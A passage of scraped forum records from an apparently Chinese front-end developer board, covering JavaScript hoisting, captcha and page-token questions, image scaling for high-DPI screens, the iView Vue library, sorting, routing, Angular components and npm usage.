变量定义的下面就正确了。这是为什么？？？\n还有一点： btn.onclick=functionName;这是对的\n但是 btn.onclick=anonymousFunctionName{}就是错的。必须要加上括号。。\n但是\nThe parentheses in this context are sometimes called the \"function invocation operator\"\n这也是 MDN 上面的原话。这又是为什么</p>\n</div></div>"], "reply": "12", "tittle": "新手求助 javascript 问题！", "comment": ["……楼主我觉得你学习的方法不太对啊……\r", "\r", "第一个问题，变量声明 hoisted ，赋值又没有，下面这段代码 console.log(a); var a = 123; console.log(a);  等价于 var a; console.log(a); a = 123; console.log(a); \r", "\r", "然后你说的第二个问题……我有点不知道你想说什么……但明显这两个问题都是因为你的理解有问题……特别是你只帖了英文原文（ which 字面上并没有错），而并没有用中文说出你自己的理解（通常如果这里你打的是中文，也就是说是你自己翻译的版本那么就很容易看出问题了，而你只是 copy 了原文问为什么，直接反应了你的理解是有问题的……）。", "第二个问题原文是这个？\r", "\r", "You might be wondering why we haven't included the parentheses after the function name. This is because we don't want to call the function immediately — only after the button has been clicked. If you try changing the line to and saving and reloading, you'll see that the message box appears without the button being clicked! The parentheses in this context are sometimes called the \"function invocation operator\". You only use them when you want to run the function immediately in the current scope. In the same respect, the code inside the anonymous function is not run immediately, as it is inside the function scope.", "兄弟你有点凶残啊。\r", "第一个问题，函数表达式解析到那里才可以调用。第二个，你说的好像是 function 后面加括号才可以？。。。", "```\r", "javascript btn.onclick = test;\r", "\r", "  function test() {\r", "    // displayMessage('Your inbox is almost full — delete some mails', 'warning');\r", "    displayMessage('Brian: Hi there, how are you today?','chat');\r", "    displayMessage('Brian: Hi there, how are you today?');\r", "  }\r", "  \r", "   function displayMessage(msgText, msgType){\r", "      ......\r", "  }\r", "```", "不推荐用 var 的方式来定义 function\r", "直接用 function foo () {}，这样可以避免变量提升的问题", " 不建议用 function xxx 来定义。\r", "\r", "建议用 const xxx = function ... 来定义", "第一个问题你看一下 js 的 “声明提升” 吧。\r", "关于第二个问题，请注意 js 中使用 function 声明函数变量中只有\r", "```\r", "function foo() {}\r", "```\r", "\r", "和匿名函数对象\r", "\r", "```\r", "function() {} \r", "```\r", "\r", "这两种形式， btn.onclick 后面要等于的是函数对象的引用，所以，你所引用的函数对象要合法....\r", "\r", "似乎，这是很基础的问题..", "不讲规矩，当然不能过...", " 函数对象的引用是函数名， 项要获得匿名函数对象的引用要完整定义？？", " 对", "test 在最开始声明了，但没有赋值\r", "你写的代码相当于下面这样\r", "var test;\r", " btn.onclick = test; //undefined\r", "\r", "  test = function() {\r", "    // displayMessage('Your inbox is almost full — delete some mails', 'warning');\r", "    displayMessage('Brian: Hi there, how are you today?','chat');\r", "    displayMessage('Brian: Hi there, how are you today?');\r", "  }\r", "  \r", "   function displayMessage(msgText, msgType){\r", "      ......\r", "  }", " 你可以这里理解，一个正确的 function 声明，不管是不是匿名的返回值都是这个 function 的引用，所以，在需要写 function 引用的地方，你就知道怎么写了吧。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>遇到一个网页 ：\n<a href=\"http://messenger3.providesupport.com/messenger/0xqyjbb1agw0f0v4ifsytq1ct9.html\" rel=\"nofollow\">http://messenger3.providesupport.com/messenger/0xqyjbb1agw0f0v4ifsytq1ct9.html</a></p>\n<p>上面有个验证码。查看是是 dada: base64  。判断是网页加载的时候通过 js 生成的数据。\n如何知道这个 js 是如何生成数据的。有人能从中知道这个验证码生成的步骤？</p>\n</div></div>"], "reply": "6", "tittle": "如何判断一个网页的 JS 做了什么", "comment": ["你看 Network ，有个请求是获取验证码的，不是 JS 生成的。", "打不开。。", "如果是 base64 的图片 一般是 Ajax 请求    通过后端生成的", "验证码都是从后端请求的，这个也是，只不过图片没有放在一个静态文件里，用到了 img src 的 data ，把图片的 base64 编码数据放到 src 里", "感觉可以用 phantomjs 载入，在载网页之前把所有全局变量都 hook 一下。没验证过是否可行"]},
{"content": ["<div class=\"topic_content\">背景知识：\r<br>屏幕的分辨率越来越高， devicePixelRatio 是“物理像素”和“逻辑像素”（也就是 CSS ）之间的比例。例如我的 iPad 上这个数值是 2 ，也就是一个 CSS 的像素，实际上是用两个设备屏幕像素来显示的（仅仅说长度哈，面积的话是平方啦）。\r<br>\r<br>麻烦事：\r<br>所以网页如果没有针对这个数值优化，图片会看起来比较模糊。咋办？用 JS 脚本优化，这个数值大，就加载清晰度更高的图片。或者直接就加载高清图片——多耗点流量。\r<br>\r<br>更麻烦的问题：\r<br>要是由于种种原因，没有高清图片，怎么办？例如这个：\r<br><a target=\"_blank\" href=\"http://initpub.com/img/i2c-a.jpg\" rel=\"nofollow\">http://initpub.com/img/i2c-a.jpg</a>\r<br>（这是电子仪器的截图，原始图片就巴掌大——直接显示就模糊，长宽除以二就太小）\r<br>\r<br>解决办法：\r<br>我是这么处理滴…… devicePixelRatio 如果大于 1.5 （例如 iPad 的数值是 2 ），长宽仅仅除以 1.5 。这样看上去不模糊，但是又不会面积太小。\r<br>\r<br>演示：\r<br><a target=\"_blank\" href=\"http://initpub.com/\" rel=\"nofollow\">http://initpub.com/</a>\r<br>我在 devicePixelRatio=1 的 PC ， devicePixelRatio=1.5 的 安卓， devicePixelRatio=2 的 iPad 测试过了，效果还不错。\r<br>相关 JS 代码在页面结尾（第一张图片，也就是“ document.images[0]”，是跳过的，因为它清晰度足够高）\r<br>\r<br>那个看贴要回帖哈，这事我倒腾了好一阵 :-)</div>"], "reply": "目前尚无回", "tittle": "[分享] 关于 devicePixelRatio 的一点经验", "comment": []},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><blockquote>\n<p>前段时间在微软参加活动，分享了 TalkingData 开源的基于 Vue.js 的高效 UI 组件库 iView 的一些开发经验，现整理成文，和大家探讨。</p>\n</blockquote>\n<p><img alt=\"\" src=\"http://ac-mhke0kuv.clouddn.com/a3bbe4a3a601873f4298.JPG\"></p>\n<p><a href=\"https://github.com/iview/iview\" rel=\"nofollow\">GitHub ： https://github.com/iview/iview</a></p>\n<h2>关于 iView</h2>\n<h3>开发历程和命名</h3>\n<p>TalkingData 可视化团队使用 Vue 有半年多时间，经历了从开始简单的使用双向绑定，到后来完全依赖 Vue 全家桶和 Webpack 的演变过程。这套开发模式验证了多个大中型项目，开发效率有了显著了提升，工作流也从半自动进化到了开发、灰度、生成环境的全自动，可以说 Vue 还是给我们带来了很愉快的开发体验。\n随着组件化的不断深入，对组件的复用和维护成了一个问题，于是开始调研市面上的 UI 组件库，发现基于 Vue 的大多是移动端的，而针对 PC 中后台的，能像阿里 Ant.Design(基于 React.js) 那样功能丰富而且高质量的，没有看中一款，要么就是不维护了，要么就是功能太简单，质量不够高。所以我们决定自己开发维护一套高质量的 UI 组件库。确定好这个目标，规划好 1.x 版本后，就开始这条不归路，最近三个多月一直投身于 iView 的开发。\n至于起 iView 这个名字，其实也没多想，以 Apple 的产品命名加上 Vue 的发音，简单好记好读，同时 GitHub 还没有注册这个组织名（就为了这些，也得把它做成一个精品😂）。</p>\n<h3>使用场景</h3>\n<p>iView 主要适合大中型中后台产品，比如某产品的运营平台、数据监控平台、管理平台等，从工程配置、到样式布局，甚至后面规划的业务套件，是一整套的解决方案，所以它可能不太适合一些 to C 的产品，比如 QQ 空间 这类的。</p>\n<h3>面向的开发者</h3>\n<p>iView 当然主要的面向对象是有过 Vue 组件化开发经验的前端工程师了，但同时对偏后端的工程师也很友好，因为我们提供好了环境配置和丰富的文档教程，即使对于像写 Java 从未接触过 Vue 开发的同学，在一周内也能很快上手，而且基于这套解决方案开发的产品是非常高效的 SPA 。</p>\n<h3>版本及兼容</h3>\n<p>目前 iView 可以直接通过 npm 安装，很快将发布一个重要版本 0.9.7 ，在这个版本中，我们对大部分组件的 UI 进行了调整和优化，也丰富了很多组件的功能。\n由于 Vue 本身原因(这里不展开)， iView 只能兼容到 IE 9+，表现最好的是 Chrome 、 Safari 、 Firefox ，有些功能和动画不能在 IE 下得到兼容。这也和使用场景有关，一般 to B 的产品，我们可以要求客户去使用高级浏览器。</p>\n<h2>iView 特点</h2>\n<ul>\n<li>基于 npm + webpack + babel + ES2015</li>\n<li>友好的 API</li>\n<li>事无巨细的文档</li>\n<li>高质量、功能丰富</li>\n</ul>\n<p>因为 iView 目前是在 webpack 下使用的，所以你可以使用 webpack 丰富的插件和个性化配置。 iView 也是使用了 ES2015 开发。\niView 一个最大的特点，就是我们从使用者和场景出发来设计 API ，这点后面会重点讲到。它的文档也是相当详细，每个功能都配有详细说明和实例代码，直接复制就可以使用，我们也计划在明年启动英文文档翻译计划。\n在开发组件时，我们阅读了很多已有组件库的代码，取长补短，实现代码的高质量。</p>\n<h2>目前进度</h2>\n<p><img alt=\"\" src=\"http://ac-mhke0kuv.clouddn.com/abb4a9d6ac233bc5c4a9.JPG\">\niView 计划在 2017 年初能够发布 1.0 版本， 1.0 将覆盖 40+常用 UI 组件，包含 Form 表单类， View 视图类， Navigation 导航类， Base 基础布局类， Chart 图表类等。图中打勾的是已经完成并上线的组件。</p>\n<h2>24 栅格系统</h2>\n<p>iView 借鉴了 Bootstrap 和 Ant.Design 的栅格系统，支持每行最多容纳 24 列的布局，栅格系统对高级浏览器支持 Flex 布局，包括 Flex 对齐、 Flex 排列、 Flex 顺序，也支持栅格的排序、偏移、间隔。友好栅格系统对页面的拆分布局起到了关键作用，你可能不用再写任何布局代码就可以轻松使用栅格完成你的需求，而且它很精准。</p>\n<h2>精心设计的 API</h2>\n<p>我们在组件 API 的设计上下了很多功夫。很多开发者在实现一个组件时，可能从编程的难易出发思考问题，而忽略了这种设计是否对使用者友好， iView 则一切以使用者为核心，我们会思考这样设计是否对使用者便利，或者如果是我用这个组件，我希望怎样来用。举个栗子，常见的页面信息提示， JavaScript 原生是<code>window.alert('something')</code>，但是用 Vue 来模拟出这样一个组件，那使用方法就像是 <code>&lt;Alert v-if=\"show\"&gt;something&lt;/Alert&gt;</code>。对的，这就是 Vue 组件的实现方法，但是，我们真的期望这样使用吗，当然不是，我们也想像原生一样，在某个时刻，一句话就能弹出来，而不用事先埋在 HTML 里，用一个 if 条件判断是否显示这个组件。\n为了更形象的介绍 iView 的 API 设计，我们拿出了一个常用的组件 Modal 模态对话框，和饿了么的 Element 及 Radon UI 这两个组件库进行对比。一般的 Modal 长这样：</p>\n<p><img alt=\"\" src=\"http://ac-mhke0kuv.clouddn.com/0a454785951408cbde46.png\">\n有标题栏(header)、关闭按钮、正文(body)、底部(footer)操作按钮，点击灰色遮罩层或键盘 Esc 键可以关闭对话框。</p>\n<p><img alt=\"\" src=\"http://ac-mhke0kuv.clouddn.com/d94e20490a6979bdd296.JPG\">\n从组件的调用方式上， Element 用的是传统组件的使用方法，也就是通过一个自定义 HTML 标签， Radon UI 是实例的方法， iView 同时支持组件和实例两种方法（这里解释一下， Element 也有支持实例调用对话框的组件，是另一个 Dialog ，不过目前是分成两个组件使用的）。\n自定义 slot 让组件复用性成为了可能。 Element 支持 body 、 footer 的 slot ， Radon UI 只支持 body ， iView 是支持 header 、 footer 、 body （其实还有关闭按钮也支持）的 slot ，几乎满足了所有 Modal 自定义需求。\n有时候我们点击确定按钮，不一样要立即关闭对话框，而是异步的获取数据，在某个时刻关闭。 Element 需要自己实现这个功能， Radon UI 则不支持， iView 是原生支持，只需要一个属性配置即可。\n在更多的自定义配置上， iView 也是最大化的进行支持（详细 API 可查阅文档）。</p>\n<h2>事无巨细的文档</h2>\n<p>iView 在文档编写上也是做到了事无巨细（由于文档用了一套相对重的方案来实现实例和代码的友好分离，故目前没有将文档开源，我们会在明年实现一个更好地提交文档 bug 及翻译的方案），每个组件的每个功能都有非常详细的说明，包括像哪些参数需要<code>.sync</code>使用，一些隐藏的功能、可能遇到的坑等等，同时每个 demo 都有完整的代码示例，一键复制，粘贴后就可以直接看到效果。\nAPI 也按照 props 、 events 、 slot 三部分拆分，避免混合说明遗漏和阅读不便利。\niView 的文档是目前所有同类文档里最为详细的，也受到了很多开发者的好评，所以我们仍会在文档开发的工作上保持高产出。</p>\n<h2>高质量，功能丰富</h2>\n<p>其实前文已经从各方面介绍了 iView 的高质量和丰富的功能，所以就举两个例子吧。</p>\n<h3>分页组件 Page ：</h3>\n<p><img alt=\"\" src=\"http://ac-mhke0kuv.clouddn.com/4d2a466064c39c86bcc4.png\">\n分页组件从功能上借鉴了 Ant.Design ，支持智能折叠页码（页码过多时，会左右折叠）、页码快进（点击···会快进或快退 5 页）、切换每页显示条数、电梯，同时还有迷你模式（支持所以普通模式的功能）和简介模式。</p>\n<h3>选择器组件 Select</h3>\n<p><img alt=\"\" src=\"http://ac-mhke0kuv.clouddn.com/d95a5a8c336e6952b72b.png\"></p>\n<p>与浏览器原生<code>&lt;select&gt;</code>不同的是，首先 UI 统一而且很好看，这是大部分模拟 select 的主要原因，其次功能更加强大，支持单选、多选，键盘的快捷操作，还支持搜索、自定义模板、分组，以及大中小三种尺寸（ iView 很多表单类组件都提供了不同的尺寸），在单选时还可以清空选项。</p>\n<h2>配套工程</h2>\n<p>最后要说的是与 iView 配套的工作流（<a href=\"https://github.com/icarusion/vue-vueRouter-webpack\" rel=\"nofollow\">https://github.com/icarusion/vue-vueRouter-webpack</a>），好马配好鞍，这套工作流支撑了 TalkingData 很多大型产品，从开发、灰度到上线都可以一键式完成，包括资源的 CDN 配置等等，不管你是新手还是老司机，都可以从它开始开发。当然 iView 也是支持 vue-cli 的。</p>\n<h2>Todo</h2>\n<ul>\n<li>iView 目前是基于 Vue.js 1.0 的，我们会在将来新开一个分支来支持 Vue 2.0 ，我们也认为 2.0 是未来的趋势。</li>\n<li>iView 很快会支持不依赖 webpack 的 umd 使用方法。</li>\n<li>目前的 UI 是以 Ant.Design 为雏形，我们在 0.9.7 版本开始逐步优化和替代，使 iView 不仅好用，还很好看。</li>\n<li>iView 明年会启动英文文档翻译计划，也希望喜欢和支持 iView ，同时英语不错的同学可以加入我们，一起参与翻译。</li>\n</ul>\n<h2>后记</h2>\n<p>iView 从正式发布 1 个月内，获得了很多好评，连续 5 天进入 GitHub Trending ，在很多社区反响不错，我们也会继续努力，把最好的 iView 组件库呈现给大家。我们也非常期望喜欢 iView 的开发者能够加入我们，一起贡献代码或是翻译文档，我们欢迎各种形式的代码贡献。如果您有想法加入翻译计划，可以邮件联系我： admin@aresn.com</p>\n</div></div>"], "reply": "22", "tittle": "Vue 高效 UI 组件库—iView 开发实践", "comment": ["Vue 高质量 ui 库确实不多，支持下", "好东西", "感觉很不错的样子，马克", "感觉完全就是 Ant Design 的 Vue.js 重制版嘛…", "之前想用的，后来发现没表格...", " 我之前也说过类似的评论，被人喷了一脸", " 我感觉这个基于你们的 UI 写的东东比较符合我们的项目需求，再次感谢", "东西很好，如果能像 element 一样提供 Axure Components 和 Sketch Template 甚至 PS 可用的就更好了。", " 但是这个库至少完成度还可以，之前也见到过一个 vue-antd 已经基本不维护了", "好东西，解决痛点", "Ant Design 在 react 之前有过一版 vue 的吧，这个显示效果几乎和 Ant 一模一样", "从 0.9.7 开始， UI 和功能都会逐步迭代完善", "ele 那个 vue 的库挺不错的", "先 mark 3Q", "那年，想把 ant design 移到 vue 上来在公司里用，然后因为太懒了就没有然后了...", "支持，持续关注着", "mark", "为什么支持 flex 布局，但是没有自动栅格呢？\r", "\r", "这个很有用", "vue2 版权重应该高一些， vue1 组件库升 vue2 的话，改双向绑定都是个巨大的工作量", "赞一个", " 同感……我用了 radon-ui ，感觉还不错，但还是没有表格", "饿了么的 ", " 还是不错的，@sofish"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>！</p>\n</div></div>"], "reply": "目前尚无回", "tittle": "bootbox 的弹出框如何居中啊！", "comment": []},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>从性能角度来看的话，是后端把已排好序的列表输出给前端好，还是由前端自己排序？</p>\n</div></div>"], "reply": "16", "tittle": "ajax 获取的数据列表的排序是后端还是前端来排更好？", "comment": ["个人观点：如果数据库能排序的话，就数据库排序。如果数据库不能排序的话，那就前端排序。", "数据库能排的话直接 foreach 好一点吧", "后端", "都好，哪个方便哪个来做", "当然是后端了，顺序包含了信息啊", "单纯你从排序的性能上看：如果不是特别大量的话，前端后端排序都影响不大可以。\r", "但是：如果你采用了前端分页，数据量又不是特别小(几十几百条)，恰巧你又要分页的话，就只能一次性把所有数据都捞出来排序了，性能方面：不管是对于前端还是后端这都是不能接受的！\r", "\r", "请注意我上面两句话描述中的『不是特别大量』以及『数据量不是特别小』", "排序一般都是后端排  \r", "除非是那种拿过来需要前端搜索啊 \r", "一般数据不大", "如果可以 在数据查询时排效率最高", "我觉得这个要看具体情况. 如果是一个比较贵的查询, 而且查询结果又不是很多, 可以前端. 但是前提是, 在上一次查询结果中进行不同排序, 而不是在整个数据库基础上进行排序.\r", "\r", "如果后端查询计算不是非常贵,  那还是后端吧, 毕竟保证了实时性和准确性.", "数据库不排序的话可能会同一 sql 得到的结果不一样。", "为了显示我大前端牛逼，当然是前端来", "测试，模拟主要访问者的硬件环境，在数据库、后端、前端做性能测试，看看那个效果最好用哪个。", "分页智能后端排，不分页就前端排", "那要看是 什么类型的列表了", "其实前端排序有云计算的感觉，但是关键是数据量 30w 条数据 一次读到前端排序试试，前后端都蛋疼。\r", "\r", "归根到底扯到架构和设计上了，没有前期 well designed 后期肯定累死", "有分页还是后端"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>index.js<br>\ndefine(function() {</p>\n<pre><code>function Window() {\n\n}\n\nWindow.prototype = {\n\n    //window 事件\n    windowscreen: function(id) {\n        //window.onload = this.getHeight(options);\n        var that = this;\n        window.onresize = function(id) {\n                that.getHeight(id);\n               //执行 onresize 函数的时候浏览器报错\n               // index.js:32 Uncaught TypeError: Cannot read property 'style' of null\n        }\n        setInterval(this.getHeight(id), 1000);\n    },\n    //获取屏幕高度让指定元素垂直居中\n    getHeight: function(id) {\n        var oDiv = document.getElementById(id),\n            screenHeight = document.documentElement.clientHeight;\n            oDiv.style.marginTop = (parseInt(screenHeight / 2)) + 'px';\n    }\n}\nreturn {\n    Window: Window\n};\n</code></pre>\n<p>});</p>\n<p>这是另外一个 js 文件\nmain.js--\nrequire.config({\npaths:{\n\"jquery\": \"jquery.min\"\n}\n})</p>\n<p>require(['jquery','index'],function($,i) {\nvar getHeight = new i.Window();\n// getHeight.getHeight('header');\n// getHeight.getHeight('main');\n// getHeight.getHeight('bottom');\ngetHeight.getHeight('header');\ngetHeight.windowscreen('header');\n})</p>\n<p>第一次接触这种写法想学习学习...处处都是坑....- -。希望大牛能够指点下我这个小白....该怎么样修改才行啊...</p>\n</div></div>"], "reply": "6", "tittle": "js 小白问个小问题希望各位大牛指点下迷津", "comment": ["第一次刚加载的时候可以执行..但是只要改变窗口就会报错....这是什么原因呢？我传了 id 进去 margintop 应该有值啊....", "好吧解决了...原因是 setIntreval 也是 window 的下的方法...粗心害死人...\r", "setInterval(function () {\r", "                that.getHeight(id);\r", "            }, \r", "这样就可以了", "不懂 ，用什么框架吗？\r", "nodejs ？\r", "兼容性测试通过吗？\r", "为什么不用 jQuery ？", "请看 js 事件，把 id 放第二个参数，第一个参数是事件对象", " 就是新手想学习学习这种写法，前面没写过这种。😳", " 嗯嗯，好的，谢谢您。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>项目地址 <a href=\"https://github.com/kliuj/spa-routers\" rel=\"nofollow\">https://github.com/kliuj/spa-routers</a></p>\n<p>简单介绍了前端路由 hash 的原理分析，并且实现了一个简单的轮子，并且用此制作一个单页面应用</p>\n</div></div>"], "reply": "3", "tittle": "前端路由 hash 的简单分析与实现", "comment": ["在这不用关心兼容性的年代，写个 hash 的路由实在太简单幸福……", " 哈哈，是简单分析和实现", "哈 你猜我是谁啊"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>angularjs 是不是不推荐 directive 了，我看官方 demo 都不用 directive 了，用 compontent ，两者有什么区别？</p>\n</div></div>"], "reply": "5", "tittle": "angularjs component", "comment": ["component 应该是以前 controller 的地位了吧， directive 还是有的， component 应该还是低级版的 directive", "应该说 component 是简化版的 directive ，但是具备了生命周期的概念", "Angular 1.5 就组件化了, 每个组件有独立的 Scope ，开发更简单。概念上接近 Angular2 （ Component 同样的 lifecycle hook ，$onInit, $onchanges, $onDestroy, etc ）， 升级到 Angular2 更容易 。\r", "\r", "在 Angular 2 中，@Component 本身也是简化的 Directive ，操作的是逻辑上的视图，而 @", " 意味更多操作 DOM Attribute （如 NgClass, NgStyle ），或者修改 DOM Structure(如 NgFor, NgIf)。", "可以看看这里 ", "\r", "\r", "Angular 1 早期的版本并没有 component 的 API ，组件和自定义 DOM 操作都使用指令实现； v1.5 新增了 component 的概念， component 的 API 比指令更简单，不涉及到 DOM 操作，只允许以自定义元素的形式指定。\r", "\r", "这实际上就是把以前指令中有关组件的实现拆分出来了。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>通用设备互联框架（ CDIF ）是一个具备中美知识产权保护的，基于 web 的连接框架，目前有部分开源实现存放在： <a href=\"https://github.com/out4b/cdif\" rel=\"nofollow\">Github: Common device interconnect framework</a>。 CDIF 是世界上第一种基于 REST 和 JSON 的 SOA 软件框架，提供了与基于 XML 的 WSDL 语言和 SOAP 协议同等抽象能力、但简洁得多的基于 JSON 的实现，也非常适合用于描述微服务架构的 API 接口。 CDIF 提供了完整的服务注册和发现能力，并为所有的 web 服务和物联网设备，包括 REST 、 SOAP 类型的服务，各种协议的物联网设备创建出一个简洁、统一的 JSON 模型；并在此基础上提供了其 REST 接口上的，基于 JSON 文本的统一 RPC 调用接口，方便了各种前端应用开发出基于该统一模型的 API 调用代码。</p>\n<p>CDIF 的总体架构如下图所示：</p>\n<p><img alt=\"CDIF arch\" src=\"https://pic2.zhimg.com/v2-83ab6bd8928e042d5f7a2d3b58fece2d_r.png\"></p>\n<p>通过框架提供的设备抽象层， CDIF 将来自不同厂商的各种类型的 REST API ，或者物联网设备封装成各种虚拟设备，并对外提供统一的虚拟设备访问 REST 接口供客户端使用。</p>\n<p>CDIF 框架代码用 node.js 书写，因此底层的虚拟设备驱动全部使用 node.js 的 npm 包进行管理。每个设备驱动可包含一到多个虚拟设备，由驱动被加载时上报给 CDIF 框架。被 CDIF 管理的虚拟设备及其 API 内部实现通过设备抽象层被封装在驱动中，这些驱动的内部实现可以使用 node.js 丰富的生态中任意一个优秀的第三方包帮助实现，比如 request, crypto, moment 等，因此非常容易开发和管理。</p>\n<p>CDIF 项目由 UPnP 标准发展而来。在支持各类云服务的 API 接口同时， CDIF 也为所有的物联网设备了一个统一的模型，并且可以方便地帮助客户端创建出物联网设备和网络服务联动的各种应用场景。</p>\n<p>由于其简洁的抽象能力，基于严格契约的松耦合架构，状态无关的可互换服务定义等优点，在 WSDL 和 SOAP 基础上打造的 SOA 技术体系至今仍然广泛应用于包括银行、交易所、航空公司、电信、医院、电商、支付平台等各行各业的大中型企业中。据 MuleSoft 估算，目前世界上每年花费在与 SOA 技术相关的企业 IT 基础设施建设和系统集成工作有 5000 亿美元之多。但由于 XML 格式用于数据交换过于复杂，以 XML 为基础的许多优秀的 WS-*标准都逐渐走向了没落。</p>\n<p>随着移动时代的发展，以 REST 和 JSON 为基础打造的各种 web 服务、微服务架构逐渐成为主流。基于 JavaScript 开发的应用，如各种 web app 等都以 REST 和 JSON 作为连接的基础。新兴 IT 企业也更倾向于使用 REST API ，而不是 SOAP 来连接企业内部的各种基础业务组件。但是，目前企业内外使用的各种 REST API 基本都需要依赖于文档手动管理，在 API 接口变化时，部署和升级新的 API 版本非常不便。 CDIF 为 REST API 建立的通用模型帮助填补了 REST API 与传统 SOA 技术的差距，并为传统 SOA 技术和云服务的结合与发展提供了全新的方向。基于 CDIF 的 SOA 技术可以方便地创建出许多全新类型的应用，比如 REST 服务流应用， web 服务和物联网设备的无缝结合等等，这些都是现有技术无法轻易实现的场景。</p>\n<p>与 WSDL 或 Swagger 等 API modelling language 不同，使用 CDIF 提供的 JSON 模型与 RPC 接口的客户端 app 不需要对被 CDIF 管理的 REST API 做离线的客户端代码生成和手动集成，便可将这些 REST API 接口及其变化通过 schema form 等组件动态地反映在客户端 UI 上供用户使用，省却了客户端对 REST API 的集成和 API 接口变化带来的繁琐的手动客户端升级工作。被 CDIF 管理的 REST API 可以将新增加的，或者变化后的 API 自动展现在 app UI 上供用户消费使用，简化了 app 开发人员的工作，同时可做到实时推广厂商新增 API 所展现的新业务能力。</p>\n<p>如果客户端 app 不希望使用这些高级特性， CDIF 提供的 REST 接口也可以向下兼容目前流行的手动集成方法。用户参考 CDIF 为 REST API 创建的通用模型便可方便地开发出基于该模型的 API 调用代码。</p>\n<p>由于做到了对 API 的访问地址和方法完全透明， CDIF 也可以较好地帮助企业解决 REST API 的变化管理这一难题。 CDIF 支持驱动代码的热切换，驱动中的 API 访问地址或方法发生变化时只需要安装新的驱动包到 CDIF 框架上，变化即可立即生效。当 API 参数或结果类型发生变化时，上层应用可以自动发现这些变化。这些特性都可以更好地帮助企业建设全自动化的运维环境。</p>\n<p>更进一步， CDIF 还可以为厂商的 REST API 提供独有的双向数据通道能力，厂商只需要调整其 REST API 对 CDIF 框架提供的统一 JSON 模型上一个 Boolean 取值便可开放该能力。此时，厂商云服务上的各种数据更新便可以实时地通过 WebSocket ， APN 等通道被 CDIF 的消息订阅者获取，而不需要由用户主动发起 API 调用更新数据，产生额外的 API 调用开销。该特性为目前所有基于 API 调用的单向云服务数据通道提供了更强大的能力。</p>\n<p>CDIF 技术的版权和开发归属<a href=\"https://apemesh.com\" rel=\"nofollow\">上海灵长软件科技有限公司</a>所有。目前我们正在基于 CDIF 打造一个全新 API 管理解决方案，敬请大家关注我们的最新进展，同时也欢迎大家向我们咨询关于 CDIF 的更多技术细节和信息。</p>\n</div></div>"], "reply": "目前尚无回", "tittle": "CDIF: 基于 REST 和 JSON 的 SOA 框架", "comment": []},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>想在移动端页面上的某个区域绑定滑动事件，用户在该区域上左滑、右滑会触发指定。我自己用 touchstart touchmove touchend 写出来的功能体验一般，斜上角滑动识别不好。想直接找个插件用，有什么插件可以推荐？</p>\n<p>本来用 jquery 1.10.2 配搭 jquery.mobile 1.4.5 就够，但是触发滑动事件时总是报错：“ Unable to preventDefault inside passive event listener due to target being treated as passive ”，谷歌一下也没找到解决方案。 jquery.mobile 好像好久没更新了，又不能跟 jquery 3.1.1 一起用，但是一句 “$(selector).on(\"swipeleft/swiperight\",childSelector,data,function,map)” 就能绑定滑动事件真的很方便，想看看大家是用什么插件 /方法的？</p>\n</div></div>"], "reply": "2", "tittle": "移动端的页面，有哪些插件可以简单地绑定滑动事件？", "comment": ["DEMO\r", "\r", "\r", "\r", "名字\r", "touchSwipe"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>地址： <a href=\"http://coupon.yhd.com/pcDandelion/B01001/1793/kxKpyMYJeFc\" rel=\"nofollow\">http://coupon.yhd.com/pcDandelion/B01001/1793/kxKpyMYJeFc</a></p>\n<p>网页加载  当鼠标移动后  dome 会加载下列 input  当鼠标移动就会更新 value 值</p>\n&lt;input type=\"hidden\" id=\"__yct_str__\" name=\"__yct_str__\" value=\"8bpOI1gkFBkk9vGMgrRd5P7W4jrwkXbMsJbtBs3larCWzEB%2BMpRn%2FcTksnRnyr62uyZ7TtQew%2FnxnchR52kSKX%2BGoOBgaPOMsVbz6ieB8%2BJeDuDAOnywwl7ZLkX5aqnmB1W0gYyT%2B%2B4Eq6WF7dHSAyfjkK%2FIjcMEzlzX2NJQfUbYPqbR%2F8uQq8435XiLQbjjb%2FzA9nmUygK8lBiJE%2FiHujBQIObBCXV7n5e65LvZuPJV%2FaHPq4pQXdeG9F4kcFx8wy9obsVORyAgKuiaFWKi3rI6vgW%2FPITnfiL7iE8a3%2FR7X3Ih9SkGNxl7oIhEyKDE\"&gt;\n<p>找了好久也没找到到底是哪里算出来的   请大牛来分析分析。</p>\n</div></div>"], "reply": "4", "tittle": "一号店 captchaToken 大牛来分析分析", "comment": [" 这里面，代码在变量里，用 eval 执行", " 我知道这个是加密的 那能不能把这种乱的替换成人类能看懂的代码", "变量 16 进制编码了。。 alert 一下就出来了", "    for in 全部输出，  然而 好难看。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>目前使用的是 pjax 化的 casper 主题，点击标题进入文章后就会看到下面的报错，最后那串数字似乎是随机的。\nFailed to load resource: the server responded with a status of 404 (Not Found)\n{{asset\"js/index.js\"}}/?_=1479023541812<br>\n然后侧栏就打不开了（使用了 jquery ），其余还是正常的，查了很久也不知道是哪里设置的不对。</p>\n</div></div>"], "reply": "2", "tittle": "ghost 博客使用 pjax 后对一个 js 文件的请求出现 404", "comment": ["147 开头 13 位，这是时间戳", "{{asset \"js/index.js\"}}\r", "asset 后面有个空格"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>cnpm install 默认下载最新版本，我想下载指定版本，应该输入什么命令行？</p>\n</div></div>"], "reply": "5", "tittle": "cnpm install 指定版本", "comment": ["npm 的是 npm install -g npm@版本号\r", "cnpm 不知道", "cnpm 只是 npm 的一个 wrapper ，所以和 npm 用法一样。", "我一直不推荐别人直接 cnpm ，用那个淘宝源就好了", "cnpm install ", "和 npm 一样， yarn 还可以指定 tag"]},
